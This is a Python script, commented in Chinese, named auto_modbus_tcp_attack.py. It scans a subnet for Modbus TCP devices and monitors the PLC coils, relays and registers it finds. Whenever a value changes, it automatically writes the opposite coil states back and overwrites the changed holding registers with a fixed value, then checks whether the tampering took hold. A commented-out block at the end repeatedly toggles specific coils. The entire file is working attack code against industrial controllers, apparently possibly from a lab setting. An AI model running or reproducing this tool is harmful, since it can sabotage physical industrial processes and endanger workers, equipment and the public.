#!/usr/bin/env python3
# -*- coding:utf-8 -*-
# 啟動命令: sudo python3 auto_modbus_tcp_attack.py 192.168.3.0/24
# 使用多執行續原因是 如果多台設備時可以同時攻擊
import threading
from wsgiref.handlers import format_date_time
import nmap3
import sys
import json
import time
from pyModbusTCP.client import ModbusClient
import datetime
from attack_log.write_log_txt import write_log
import copy
from collections import Counter #計算攻擊次數

scan_start_time_interval=2 #每隔3分鐘
attack_number=10#攻擊次數
scan_number=10
coil_number=850 #y
m_number=8200 #m
m_number=m_number-8192
h_number=100 #h
d_number=10 #d

attack_state=0 #是否攻擊(0為不攻擊,1為攻擊)

modbus_tcp_client=0



all_plc_state=[]
attack_all_plc_state_information=[]
attack_after_PLC_state=[]

write_log_object=write_log()
write_log_object.delete_old_log_file()
write_log_object.write_log_txt('------------')

def spilt_sub_ip_name_string(message):
    value=message.rsplit('.',1)
    return value


def modbus_tcp_is_connected(ip_address,ports):
    # global modbus_tcp_client
    modbus_tcp_client = ModbusClient(ip_address,ports,auto_open=True) #UID 可能可以不用設
    temp=modbus_tcp_client.read_coils(1)
    # if modbus_tcp_client.is_open():
    if temp != None:
        tempp={}
        tempp['ip']=ip_address
        tempp['port']=[]
        tempp['port'].append(ports)
        # tempp.append(ip_address)
        # tempp.append(ports)
        modbus_tcp_client.close()
        return tempp
    else:
        return None

    

def modbus_tcp_scan_PLC_state(ip_address,ports,modbus_tcp_client):
    global all_plc_state
    # global modbus_tcp_client
    list_id=0
    for i in range(len(all_plc_state)):
        if all_plc_state[i]['ip']==ip_address:
            list_id=i
    # modbus_tcp_client = ModbusClient(ip_address,ports,auto_open=True) #UID 可能可以不用設
    try:
        PLC_state_list=[]
        PLC_coils_state_list=[] #modbus tcp function code 1
        PLC_auxiliary_relay_state_list=[] #modbus tcp function code 1
        PLC_holding_registers_state_list=[] #modbus tcp function code 3
        PLC_discrete_inputs_state_list=[]  #modbus tcp function code 2
        print('modbus_tcp_scan_PLC_state_1_start')
        #--1
        # for i in range(coil_number):
        #     PLC_coils_state_list.append(modbus_tcp_client.read_coils(i))
        #     time.sleep(scan_time_sleep_second+0.015)
        #--2
        # temp=modbus_tcp_client.read_coils(0,coil_number)
        # for i in range(coil_number):
        #     PLC_coils_state_list.append(str(temp[i]))
        #--3
        for i in range(scan_number+1):
            temp=copy.deepcopy(modbus_tcp_client.read_coils(0,coil_number))
        write_log_object.write_log_txt('modbus_tcp_scan_PLC_state_1_start='+str(temp))
        if temp !=None:
            for i in range(coil_number):
                    PLC_coils_state_list.append(temp[i])
        # print('test1='+str(modbus_tcp_client.read_coils(0,coil_number)))
        #--1
        # for i in range(8192,m_number):
        #     PLC_auxiliary_relay_state_list.append(modbus_tcp_client.read_coils(i))
        #     time.sleep(scan_time_sleep_second+0.015)
        #--2
        # temp=modbus_tcp_client.read_coils(8192,m_number)
        # for i in range(m_number):
        #     PLC_auxiliary_relay_state_list.append(str(temp[i]))
        #--3
        for i in range(scan_number+1):
            temp=copy.deepcopy(modbus_tcp_client.read_coils(8192,m_number))
            print('modbus_tcp_scan_PLC_state_read_coils(8192)='+str(temp))
            print('modbus_tcp_scan_PLC_state_read_coils type='+str(type(temp)))
        if temp !=None:
            for i in range(m_number):
                PLC_auxiliary_relay_state_list.append(temp[i])
        # print('test2='+str(modbus_tcp_client.read_coils(8192,m_number)))
        # for i in range(0,h_number):
        #     PLC_holding_registers_state_list.append(modbus_tcp_client.read_holding_registers(i))
        #     time.sleep(scan_time_sleep_second+0.015)
        for i in range(scan_number+1):
            temp=copy.deepcopy(modbus_tcp_client.read_holding_registers(0,h_number))
        if temp !=None:
            for i in range(h_number):
                PLC_holding_registers_state_list.append(temp[i])
        # for i in range(0,d_number):
        #     PLC_discrete_inputs_state_list.append(modbus_tcp_client.read_discrete_inputs(i))
        #     time.sleep(scan_time_sleep_second+0.015)
        for i in range(scan_number+1):
            temp=copy.deepcopy(modbus_tcp_client.read_discrete_inputs(0,d_number))
        if temp !=None:
            for i in range(d_number):
                PLC_discrete_inputs_state_list.append(temp[i])
        PLC_state_list.append(PLC_coils_state_list)
        PLC_state_list.append(PLC_auxiliary_relay_state_list)
        PLC_state_list.append(PLC_holding_registers_state_list)
        PLC_state_list.append(PLC_discrete_inputs_state_list)
        all_plc_state[list_id]['PLC_State']=PLC_state_list
        write_log_object.write_log_txt('modbus_tcp_scan_PLC_state_1='+str(all_plc_state))
        # write_log_object.write_log_txt('thread['+str(list_id)+']='+str(all_plc_state[list_id]))
        print('modbus_tcp_scan_PLC_state_1_stop')
        # modbus_tcp_client.close()
    except KeyboardInterrupt:
        modbus_tcp_client.close()


def modbus_tcp_scan_PLC_state_2(ip_address,ports,modbus_tcp_client_2):
    global all_plc_state
    global attack_state
    # global modbus_tcp_client
    list_id=0
    state=0
    if attack_state==1:
        state=1
    for i in range(len(all_plc_state)):
        if all_plc_state[i]['ip']==ip_address:
            list_id=i
    # modbus_tcp_client_2 = ModbusClient(ip_address,ports,auto_open=True) #UID 可能可以不用設
    while True:
        try:        
            t_now_time=datetime.datetime.now()
            if t_now_time.minute%scan_start_time_interval==0 and t_now_time.second==0:
                time.sleep(1)
                PLC_state_list=[]
                PLC_coils_state_list=[] #modbus tcp function code 1
                PLC_auxiliary_relay_state_list=[] #modbus tcp function code 1
                PLC_holding_registers_state_list=[] #modbus tcp function code 3
                PLC_discrete_inputs_state_list=[]  #modbus tcp function code 2
                print('modbus_tcp_scan_PLC_state_2_start')
                # for i in range(coil_number):
                #     PLC_coils_state_list.append(modbus_tcp_client_2.read_coils(i))
                #     time.sleep(scan_time_sleep_second+0.035)
                # temp=modbus_tcp_client_2.read_coils(0,coil_number)
                # for i in range(coil_number):
                #     PLC_coils_state_list.append(str(temp[i]))
                for i in range(scan_number-state):
                    temp=copy.deepcopy(modbus_tcp_client_2.read_coils(0,coil_number))
                    # temp=copy.deepcopy(modbus_tcp_client.read_coils(0,coil_number))
                for i in range(coil_number):
                    if temp[i]!=None:
                        PLC_coils_state_list.append(temp[i])
                # for i in range(8192,m_number):
                #     PLC_auxiliary_relay_state_list.append(modbus_tcp_client_2.read_coils(i))
                #     time.sleep(scan_time_sleep_second+0.035)
                # temp=modbus_tcp_client_2.read_coils(8192,m_number)
                # for i in range(m_number):
                #     PLC_auxiliary_relay_state_list.append(str(temp[i]))
                for i in range(scan_number-state):
                    temp=copy.deepcopy(modbus_tcp_client_2.read_coils(8192,m_number))
                    # temp=copy.deepcopy(modbus_tcp_client.read_coils(8192,m_number))
                if temp !=None:
                    for i in range(m_number):
                        PLC_auxiliary_relay_state_list.append(temp[i])
                # for i in range(0,h_number):
                #     PLC_holding_registers_state_list.append(modbus_tcp_client_2.read_holding_registers(i))
                #     time.sleep(scan_time_sleep_second+0.035)
                for i in range(scan_number-state):
                    temp=copy.deepcopy(modbus_tcp_client_2.read_holding_registers(0,h_number))
                    # temp=copy.deepcopy(modbus_tcp_client.read_holding_registers(0,h_number))
                if temp !=None:
                    for i in range(h_number):
                        PLC_holding_registers_state_list.append(temp[i])
                # for i in range(0,d_number):
                #     PLC_discrete_inputs_state_list.append(modbus_tcp_client_2.read_discrete_inputs(i))
                #     time.sleep(scan_time_sleep_second+0.0015)
                for i in range(scan_number-state):
                    temp=copy.deepcopy(modbus_tcp_client_2.read_discrete_inputs(0,d_number))
                    # temp=copy.deepcopy(modbus_tcp_client.read_discrete_inputs(0,d_number))
                if temp !=None:
                    for i in range(d_number):
                        PLC_discrete_inputs_state_list.append(temp[i])
                PLC_state_list.append(PLC_coils_state_list)
                PLC_state_list.append(PLC_auxiliary_relay_state_list)
                PLC_state_list.append(PLC_holding_registers_state_list)
                PLC_state_list.append(PLC_discrete_inputs_state_list)
                all_plc_state[list_id]['PLC_State']=PLC_state_list
                print('modbus_tcp_scan_PLC_state_2_stop')
                del temp,PLC_state_list,PLC_coils_state_list,PLC_auxiliary_relay_state_list,PLC_holding_registers_state_list,PLC_discrete_inputs_state_list
                write_log_object.write_log_txt('modbus_tcp_scan_PLC_state_2='+str(all_plc_state))
                # write_log_object.write_log_txt('thread2['+str(list_id)+']='+str(all_plc_state[list_id]))
            # modbus_tcp_client_2.close()
        except KeyboardInterrupt:
            modbus_tcp_client_2.close()
            # modbus_tcp_client.close()

def modbus_tcp_plc_state_is_change(list1,list2):
    tt_temp=[]
    for i in range(len(list1)):
        # print('i='+str(i))
        t_temp={}
        t_temp['ip']=list1[i]['ip']
        t_temp['port']=list1[i]['port']
        t_temp['PLC_State_is_change_address']=[]
        t_temp['PLC_State']=[]
        for j in range(len(list1[i]['PLC_State'])):#0~2
            t_temppp=[]
            t_temppp_2=[]
            if j==1: # auxiliary_relay
                t_len=len(list1[i]['PLC_State'][j])
                for k in range(t_len): # 0~1024 and 0~8000 (coils,data_register)
                    if list1[i]['PLC_State'][j][k]!=list2[i]['PLC_State'][j][k]:
                        t_temppp.append(k+8192)
                        t_temppp_2.append(list2[i]['PLC_State'][j][k])
                t_temp['PLC_State_is_change_address'].append(t_temppp)
                t_temp['PLC_State'].append(t_temppp_2)
            else:  # 0~1024 and 0~8000 (coils,data_register)
                for k in range(len(list1[i]['PLC_State'][j])):
                    if list1[i]['PLC_State'][j][k]!=list2[i]['PLC_State'][j][k]:
                        t_temppp.append(k)
                        t_temppp_2.append(list2[i]['PLC_State'][j][k])
                t_temp['PLC_State_is_change_address'].append(t_temppp)
                t_temp['PLC_State'].append(t_temppp_2)
        tt_temp.append(t_temp)
        write_log_object.write_log_txt('tt_temp='+str(tt_temp))
    return tt_temp

def modbus_tcp_attack_function(list,list_id,modbus_tcp_client):
    write_log_object.write_log_txt('modbus_tcp_attack_function_id='+str(list_id))
    global attack_all_plc_state_information
    # global modbus_tcp_client
    attack_all_plc_state_information=copy.deepcopy(list)
    attack_all_plc_state_information[list_id]['replay_state']=[]
    # modbus_tcp_client = ModbusClient(attack_all_plc_state_information[list_id]['ip'],attack_all_plc_state_information[list_id]['port'][0],auto_open=True) #UID 可能可以不用設
    try:
        #write Coil 線圈
        print('-----attack PLC write Coil -----')
        if attack_all_plc_state_information[list_id]['PLC_State_is_change_address'][0]:
            temp_len=len(attack_all_plc_state_information[list_id]['PLC_State_is_change_address'][0])
            temp_list=[]
            for i in range(temp_len):
                t_temp=[]
                t_temp_data={}
                for j in range(attack_number):
                    if attack_all_plc_state_information[list_id]['PLC_State'][0][i]==True:
                        response_1=modbus_tcp_client.write_single_coil(attack_all_plc_state_information[list_id]['PLC_State_is_change_address'][0][i],False)
                    else:
                        response_1=modbus_tcp_client.write_single_coil(attack_all_plc_state_information[list_id]['PLC_State_is_change_address'][0][i],True)
                    # time.sleep(attack_time_sleep_second)
                    t_temp.append(response_1)
                temp=Counter(t_temp)
                t_temp_data['True']=temp[True]
                t_temp_data['None']=temp[None]
                temp_list.append(t_temp_data)
            attack_all_plc_state_information[list_id]['replay_state'].append(temp_list)
            # modbus_tcp_client.close()
        #write M0 線圈暫存器
        print('-----attack PLC write M0 (Auxiliary relay) -----')
        if attack_all_plc_state_information[list_id]['PLC_State_is_change_address'][1]:
            temp_len=len(attack_all_plc_state_information[list_id]['PLC_State_is_change_address'][1])
            temp_list=[]
            for i in range(temp_len):
                t_temp=[]
                t_temp_data={}
                for j in range(attack_number):
                    if attack_all_plc_state_information[list_id]['PLC_State'][1][i]==True:
                        response_2=modbus_tcp_client.write_single_coil(attack_all_plc_state_information[list_id]['PLC_State_is_change_address'][1][i],False)
                    else:
                        response_2=modbus_tcp_client.write_single_coil(attack_all_plc_state_information[list_id]['PLC_State_is_change_address'][1][i],True)
                    # time.sleep(attack_time_sleep_second)
                    t_temp.append(response_2)
                temp=Counter(t_temp)
                t_temp_data['True']=temp[True]
                t_temp_data['None']=temp[None]
                temp_list.append(t_temp_data)
            attack_all_plc_state_information[list_id]['replay_state'].append(temp_list)
            # modbus_tcp_client.close()
        #write D0 數據暫存器
        print('-----attack PLC write D0 (holding_registers) -----')
        if attack_all_plc_state_information[list_id]['PLC_State_is_change_address'][2]:
            temp_len=len(attack_all_plc_state_information[list_id]['PLC_State_is_change_address'][2])
            temp_list=[]
            for i in range(temp_len):
                t_temp=[]
                t_temp_data={}
                for j in range(attack_number):
                    if attack_all_plc_state_information[list_id]['PLC_State'][2][i]:
                       response_3=modbus_tcp_client.write_single_register(attack_all_plc_state_information[list_id]['PLC_State_is_change_address'][2][i],5376) #5376 = 我生氣了 # D_attack_Inform=['5376']
                    # time.sleep(attack_time_sleep_second)
                    t_temp.append(response_3)
                temp=Counter(t_temp)
                t_temp_data['True']=temp[True]
                t_temp_data['None']=temp[None]
                temp_list.append(t_temp_data)
            attack_all_plc_state_information[list_id]['replay_state'].append(temp_list)
        # write_log_object.write_log_txt('modbus_tcp_attack_function['+str(list_id)+']='+str()
        # modbus_tcp_client.close()
    except KeyboardInterrupt:
        modbus_tcp_client.close()  




def modbus_tcp_after_attack_PLC_scan_PLC_state(ip_address,ports,modbus_tcp_client_3):
    global all_plc_state
    global attack_after_PLC_state
    # global modbus_tcp_client
    # modbus_tcp_client_3=modbus_tcp_client
    attack_after_PLC_state=copy.deepcopy(all_plc_state)
    list_id=0
    for i in range(len(attack_after_PLC_state)):
        if attack_after_PLC_state[i]['ip']==ip_address:
            list_id=i
    try:
        # modbus_tcp_client_3 = ModbusClient(ip_address,ports,auto_open=True) #UID 可能可以不用設
        PLC_state_list=[]
        PLC_coils_state_list=[] #modbus tcp function code 1
        PLC_auxiliary_relay_state_list=[] #modbus tcp function code 1
        PLC_holding_registers_state_list=[] #modbus tcp function code 3
        PLC_discrete_inputs_state_list=[]  #modbus tcp function code 2
        print('modbus_tcp_after_attack_PLC_scan_PLC_state_start')

        
        temp=copy.deepcopy(modbus_tcp_client_3.read_coils(0,coil_number))
        if temp !=None:
            for i in range(coil_number):
                PLC_coils_state_list.append(temp[i])
        
        
        temp=copy.deepcopy(modbus_tcp_client_3.read_coils(8192,m_number))
        if temp !=None:
            for i in range(m_number):
                PLC_auxiliary_relay_state_list.append(temp[i])
        
        
        temp=copy.deepcopy(modbus_tcp_client_3.read_holding_registers(0,h_number))
        if temp !=None:
            for i in range(h_number):
                PLC_holding_registers_state_list.append(temp[i])
        
        
        temp=copy.deepcopy(modbus_tcp_client_3.read_discrete_inputs(0,d_number))
        if temp !=None:
            for i in range(d_number):
                PLC_discrete_inputs_state_list.append(temp[i])
        PLC_state_list.append(PLC_coils_state_list)
        PLC_state_list.append(PLC_auxiliary_relay_state_list)
        PLC_state_list.append(PLC_holding_registers_state_list)
        PLC_state_list.append(PLC_discrete_inputs_state_list)
        attack_after_PLC_state[list_id]['PLC_State']=PLC_state_list
        write_log_object.write_log_txt('modbus_tcp_after_attack_PLC_scan_PLC_state='+str(attack_after_PLC_state))
        # print('modbus_tcp_after_attack_PLC_scan_PLC_state='+str(attack_after_PLC_state))
        print('modbus_tcp_after_attack_PLC_scan_PLC_state_stop')
        # modbus_tcp_client_3.close()
    except KeyboardInterrupt:
        modbus_tcp_client_3.close()  

def attack_differ_list(list1,list2):
    list3=copy.deepcopy(list1)
    for i in range(len(list1)):
        for j in range(len(list1[i]['PLC_State_is_change_address'])):
            list3[i]['PLC_State_is_change_address'][j]=[]
            list3[i]['PLC_State'][j]=[]
            temp = [x for x in list2[i]['PLC_State_is_change_address'][j] if x not in list1[i]['PLC_State_is_change_address'][j]]
            # print('list3['+str(i)+']["PLC_State_is_change_address"]['+str(j)+']='+str(temp))
            list3[i]['PLC_State_is_change_address'][j]=temp
            if len(temp)>0:
                for k in range(len(list2[i]['PLC_State_is_change_address'][j])):
                    for l in range(len(temp)):
                        if temp[l]==list2[i]['PLC_State_is_change_address'][j][k]:
                            list3[i]['PLC_State'][j].append(list2[i]['PLC_State'][j][k])
    # print('list3='+str(list3))
    return list3
print('------')

#---- scan host open port------#
write_log_object.write_log_txt(datetime.datetime.now())
print('start_time='+str(datetime.datetime.now()))
ip_range=sys.argv[1]
sub_ip=spilt_sub_ip_name_string(str(ip_range))
sub_ip=sub_ip[0]+'.'
computer_information=[]
nmapp=nmap3.NmapHostDiscovery()
for i in range(10,14): #掃描ip數量
    scan_ip_address=sub_ip+str(i)
    print('ip='+scan_ip_address)
    results = nmapp.nmap_portscan_only(scan_ip_address)
    if len(results)>2: #有找到機器開機並開幾服務(port)
        data={}
        data['ip']=scan_ip_address
        data['port']=[]
        port_len=len(results[scan_ip_address]['ports'])
        for j in range(port_len):
            port_number=results[scan_ip_address]['ports'][j]['portid']
            data['port'].append(port_number)
        # 怕有些機器開啟不會回應502 port
        data['port'].append(str(502))
        computer_information.append(data)
        print('-----------------------')
print('computer_information='+str(computer_information))
write_log_object.write_log_txt('step1='+str(computer_information))
write_log_object.write_log_txt('****************')
#------computer_information to json------
# jjson_str=json.dumps(computer_information)
# print('jjson_str='+str(jjson_str))
tempp=[]
for i in range(len(computer_information)):
    for j in range(len(computer_information[i]['port'])):
        temp=modbus_tcp_is_connected(computer_information[i]['ip'],computer_information[i]['port'][j])
        if temp !=None:
            tempp.append(temp)
computer_information=tempp

# computer_information=[{'ip': '192.168.3.40', 'port': ['502']}]
print("computer_information="+str(computer_information))
write_log_object.write_log_txt('step2='+str(computer_information))
write_log_object.write_log_txt('****************')
all_plc_state=computer_information
# modbus_tcp_client_list=copy.deepcopy(computer_information)
# write_log_object.write_log_txt('modbus_tcp_client_list_1='+str(modbus_tcp_client_list))
scan_threads=[]
scan_threads2=[]
modbus_tcp_client_list=[]
try:
    for i in range(len(all_plc_state)):
        temp={}
        temp['ip']=all_plc_state[i]['ip']
        temp['port']=[]
        temp['modbus_tcp_socket']=[]
        for j in range(len(all_plc_state[i]['port'])):
            temp['port'].append(all_plc_state[i]['port'][j])
            temp['modbus_tcp_socket'].append(ModbusClient(all_plc_state[i]['ip'],all_plc_state[i]['port'][j],auto_open=True)) #UID 可能可以不用設
        modbus_tcp_client_list.append(temp)
    
    for i in range(len(all_plc_state)):
        for j in range(len(all_plc_state[i]['port'])):
            thread=threading.Thread(target=modbus_tcp_scan_PLC_state,args=(modbus_tcp_client_list[i]['ip'],modbus_tcp_client_list[i]['port'][j],copy.deepcopy(modbus_tcp_client_list[i]['modbus_tcp_socket'][j]),))
            scan_threads.append(thread)
            thread.start()
    
    for thread in scan_threads:  # iterates over the threads
        thread.join()       # waits until the thread has finished work
    print('scan_thread_1_is_ok')
    

    for i in range(len(all_plc_state)):
        temp={}
        temp['modbus_tcp_socket']=[]
        for j in range(len(all_plc_state[i]['port'])):
            thread2=threading.Thread(target=modbus_tcp_scan_PLC_state_2,args=(modbus_tcp_client_list[i]['ip'],modbus_tcp_client_list[i]['port'][j],copy.deepcopy(modbus_tcp_client_list[i]['modbus_tcp_socket'][j]),))
            scan_threads2.append(thread2)
            thread2.start()
    print('scan_thread_2_is_run')
    write_log_object.write_log_txt('modbus_tcp_client_list='+str(modbus_tcp_client_list))
    time.sleep(scan_start_time_interval) #先等待所有掃描回來
    old_all_plc_state=copy.deepcopy(all_plc_state) #指複製東西，不會跟著全域一起變動
    state_is_change=[]
    old_time=datetime.datetime.now()
    # print('old_all_plc_state[0][PLC_State][1][0]'+str(old_all_plc_state[0]['PLC_State'][1][0]))
    print('old_time='+str(old_time.minute))
    while True:
        now_time=datetime.datetime.now()
        if now_time.minute%scan_start_time_interval==0 and now_time.second==0:
            time.sleep(1)
            print('old_now_time='+str(now_time.minute))
            write_log_object.write_log_txt('now_time='+str(now_time.minute))
            write_log_object.write_log_txt('--------------')
            if old_all_plc_state!=all_plc_state:
                attack_state=1
                print('now_now_time='+str(now_time.minute))
                state_is_change=modbus_tcp_plc_state_is_change(old_all_plc_state,all_plc_state)
                write_log_object.write_log_txt('now_time='+str(now_time.minute))
                write_log_object.write_log_txt('state_is_change='+str(state_is_change))
                # print('state_is_change='+str(state_is_change))
                old_all_plc_state=copy.deepcopy(all_plc_state) #指複製東西，不會跟著全域一起變動
                attack_thread_list=[]
                for i in range(len(state_is_change)):
                    thread3=threading.Thread(target=modbus_tcp_attack_function,args=(state_is_change,i,copy.deepcopy(modbus_tcp_client_list[i]['modbus_tcp_socket'][0])))
                    attack_thread_list.append(thread3)
                    thread3.start()
                for thread_3 in attack_thread_list:  # iterates over the threads
                    thread_3.join()       # waits until the thread has finished work
                # print('attack_all_plc_state_information='+str(attack_all_plc_state_information))
                write_log_object.write_log_txt('attack_all_plc_state_information='+str(attack_all_plc_state_information))
                
                check_attack_after_thread_list=[]
                
                for i in range(len(old_all_plc_state)):
                    for j in range(len(old_all_plc_state[i]['port'])):
                        thread4=threading.Thread(target=modbus_tcp_after_attack_PLC_scan_PLC_state,args=(old_all_plc_state[i]['ip'],old_all_plc_state[i]['port'][j],copy.deepcopy(modbus_tcp_client_list[i]['modbus_tcp_socket'][j]),))
                        check_attack_after_thread_list.append(thread4)
                        thread4.start()
                for thread_4 in check_attack_after_thread_list:  # iterates over the threads
                    thread_4.join()       # waits until the thread has finished work
                # for i in range(len(attack_after_PLC_state)):
                # for i in range(len(attack_after_PLC_state)):
                attack_after_state_is_change=modbus_tcp_plc_state_is_change(old_all_plc_state,attack_after_PLC_state)
                write_log_object.write_log_txt('attack_after_state_is_change='+str(attack_after_state_is_change))
                # print('attack_after_state_is_change='+str(attack_after_state_is_change))

                attack_after_information=attack_differ_list(state_is_change,attack_after_state_is_change)
                print('--------------attack after PLC State ------------------------------')
                print('attack_after_information='+str(attack_after_information))
                write_log_object.write_log_txt('attack_after_information='+str(attack_after_information))
                attack_state=0
                

                
                


    # while True:
    #     print('all_plc_state='+str(all_plc_state))
    #     write_log_object.write_log_txt('all_plc_state[0]='+str(all_plc_state[0]))
    #     write_log_object.write_log_txt('all_plc_state[1]='+str(all_plc_state[1]))
    #     write_log_object.write_log_txt('---------------------------------')
    # for thread in threads:  # iterates over the threads
    #     thread.join()       # waits until the thread has finished work

except KeyboardInterrupt:
    for i in range(len(scan_threads)):
        scan_threads[i].kill()
    for i in range(len(scan_threads2)):
        scan_threads2[i].kill()
    for i in range(len(attack_thread_list)):
        attack_thread_list[i].kill()
    del modbus_tcp_client_list



        
        

    









# threads=[]
# for i in range(len(computer_information)):
#     thread=threading.Thread(target=modbus_tcp_attack_function,args=(computer_information[i]['ip'],computer_information[i]['port'],))
#     threads.append(thread)
#     thread.start()

# for thread in threads:  # iterates over the threads
#     thread.join()       # waits until the thread has finished work




# modbus_tcp_client = ModbusClient(computer_information[0]['ip'],502,auto_open=True) #UID 可能可以不用設
# print('write Coil 8197 is='+str(modbus_tcp_client.write_single_coil(8197,False)))
# print('write Coil 8195 is='+str(modbus_tcp_client.write_single_coil(8195,False)))
# print('Read Coil  8195 is='+str(modbus_tcp_client.read_coils(8195)))
# try:
#     while True:
#         modbus_tcp_client.write_single_coil(8197,False)
#         modbus_tcp_client.write_single_coil(8195,False)
#         print('Read Coil  8197 is='+str(modbus_tcp_client.read_coils(8197)))
#         print('Read Coil  8195 is='+str(modbus_tcp_client.read_coils(8195)))
#         time.sleep(0.1)
#         modbus_tcp_client.write_single_coil(8197,True)
#         modbus_tcp_client.write_single_coil(8195,True)
#         print('Read Coil  8197 is='+str(modbus_tcp_client.read_coils(8197)))
#         print('Read Coil  8195 is='+str(modbus_tcp_client.read_coils(8195)))
#         print('-------------------------------')
# except KeyboardInterrupt:
#     modbus_tcp_client.write_single_coil(8197,False)
#     modbus_tcp_client.write_single_coil(8195,False)
#     # modbus_tcp_client.write_single_coil(8197,True)
#     # modbus_tcp_client.write_single_coil(8195,True)
#     modbus_tcp_client.close()
    
    

            


# computer_information=[
#     {'ip':'192.168.3.40',
#      'port':[502,
#              503
#         ]
#      },
#       {'ip':'192.168.3.41',
#         'port':[502,
#                 503
#         ]
#      }
#     ]




